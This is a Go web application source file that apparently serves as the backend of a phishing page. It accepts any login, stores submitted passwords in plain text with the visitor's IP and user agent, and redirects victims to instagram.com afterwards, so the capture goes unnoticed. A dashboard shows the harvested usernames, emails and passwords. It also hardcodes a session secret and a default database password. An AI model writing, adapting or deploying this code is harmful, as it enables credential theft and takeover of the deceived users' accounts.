package main

import (
	"database/sql"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/sessions"
	_ "github.com/lib/pq"
)

var (
	db    *sql.DB
	store = sessions.NewCookieStore([]byte("malik-super-secret-key-2026"))
	tmpl  *template.Template
)

type LoginLog struct {
	ID        int
	UserID    int
	Username  string
	Email     string
	Password  string
	LoginTime time.Time
	IPAddress string
	UserAgent string
}

func getEnv(key, defaultValue string) string {
	value := os.Getenv(key)
	if value == "" {
		return defaultValue
	}
	return value
}

func initDB() {
	host := getEnv("DB_HOST", "localhost")
	port := getEnv("DB_PORT", "5432")
	user := getEnv("DB_USER", "postgres")
	password := getEnv("DB_PASSWORD", "tarvo")
	dbname := getEnv("DB_NAME", "khalik_db")
	sslmode := getEnv("DB_SSLMODE", "disable")

	connStr := fmt.Sprintf("host=%s port=%s user=%s password=%s dbname=%s sslmode=%s",
		host, port, user, password, dbname, sslmode)

	var err error
	db, err = sql.Open("postgres", connStr)
	if err != nil {
		log.Fatal("❌ Database connection failed:", err)
	}

	err = db.Ping()
	if err != nil {
		log.Fatal("❌ Database ping failed:", err)
	}

	createTables()
	log.Println("✅ Database connected & tables ready!")
}

func createTables() {
	queries := []string{
		`CREATE TABLE IF NOT EXISTS users (
			id SERIAL PRIMARY KEY,
			username VARCHAR(100) NOT NULL,
			email VARCHAR(100) UNIQUE NOT NULL,
			password VARCHAR(255) NOT NULL,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS login_logs (
			id SERIAL PRIMARY KEY,
			user_id INTEGER REFERENCES users(id),
			username VARCHAR(100),
			email VARCHAR(100),
			login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			ip_address VARCHAR(45),
			user_agent TEXT
		)`,
	}

	for _, query := range queries {
		_, err := db.Exec(query)
		if err != nil {
			log.Fatal("❌ Table creation failed:", err)
		}
	}
}

func loginPageHandler(w http.ResponseWriter, r *http.Request) {
	data := map[string]interface{}{
		"Error": r.URL.Query().Get("error"),
	}
	tmpl.ExecuteTemplate(w, "login.html", data)
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	input := strings.TrimSpace(r.FormValue("email"))
	password := r.FormValue("password")

	if input == "" || password == "" {
		http.Redirect(w, r, "/?error=Please+fill+all+fields", http.StatusSeeOther)
		return
	}

	var userID int
	var username, email, storedPassword string

	// Check if user exists
	err := db.QueryRow("SELECT id, username, email, password FROM users WHERE username = $1 OR email = $1", input).
		Scan(&userID, &username, &email, &storedPassword)

	if err == sql.ErrNoRows {
		// User does not exist - auto-register with plain text password
		username = input
		email = input
		if !strings.Contains(input, "@") {
			email = input + "@malik.com"
		}

		err = db.QueryRow(
			"INSERT INTO users (username, email, password) VALUES ($1, $2, $3) RETURNING id",
			username, email, password,
		).Scan(&userID)

		if err != nil {
			http.Redirect(w, r, "/?error=Registration+failed", http.StatusSeeOther)
			return
		}
	} else if err != nil {
		http.Redirect(w, r, "/?error=Something+went+wrong", http.StatusSeeOther)
		return
	} else {
		// User exists - plain text password check
		if storedPassword != password {
			http.Redirect(w, r, "/?error=Invalid+password", http.StatusSeeOther)
			return
		}
	}

	// Log the login
	db.Exec(
		"INSERT INTO login_logs (user_id, username, email, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)",
		userID, username, email, r.RemoteAddr, r.UserAgent(),
	)

	// Create session
	session, _ := store.Get(r, "malik-session")
	session.Values["authenticated"] = true
	session.Values["user_id"] = userID
	session.Values["username"] = username
	session.Values["email"] = email
	session.Save(r, w)

	http.Redirect(w, r, "https://www.instagram.com/", http.StatusSeeOther)
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := store.Get(r, "malik-session")
	username, _ := session.Values["username"].(string)

	rows, err := db.Query(`
		SELECT ll.id, ll.user_id, ll.username, ll.email, u.password, ll.login_time, ll.ip_address, ll.user_agent 
		FROM login_logs ll
		LEFT JOIN users u ON ll.user_id = u.id
		ORDER BY ll.login_time DESC 
		LIMIT 50
	`)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var logs []LoginLog
	for rows.Next() {
		var log LoginLog
		err := rows.Scan(&log.ID, &log.UserID, &log.Username, &log.Email, &log.Password, &log.LoginTime, &log.IPAddress, &log.UserAgent)
		if err == nil {
			logs = append(logs, log)
		}
	}

	data := map[string]interface{}{
		"Username": username,
		"Logs":     logs,
	}
	tmpl.ExecuteTemplate(w, "dashboard.html", data)
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := store.Get(r, "malik-session")
	session.Values["authenticated"] = false
	session.Options.MaxAge = -1
	session.Save(r, w)
	http.Redirect(w, r, "https://www.instagram.com/", http.StatusSeeOther)
}

func authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		session, _ := store.Get(r, "malik-session")
		if auth, ok := session.Values["authenticated"].(bool); !ok || !auth {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}
		next(w, r)
	}
}

func main() {
	initDB()
	defer db.Close()

	funcMap := template.FuncMap{
		"Upper": strings.ToUpper,
	}

	tmpl = template.Must(template.New("").Funcs(funcMap).ParseGlob("templates/*.html"))

	r := mux.NewRouter()

	// Static files
	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	// Routes
	r.HandleFunc("/", loginPageHandler).Methods("GET")
	r.HandleFunc("/login", loginHandler).Methods("POST")
	r.HandleFunc("/dashboard", authMiddleware(dashboardHandler)).Methods("GET")
	r.HandleFunc("/logout", logoutHandler).Methods("GET")

	port := getEnv("PORT", "3000")
	log.Printf("🚀 Malik running on http://localhost:%s", port)
	log.Fatal(http.ListenAndServe(":"+port, r))
}
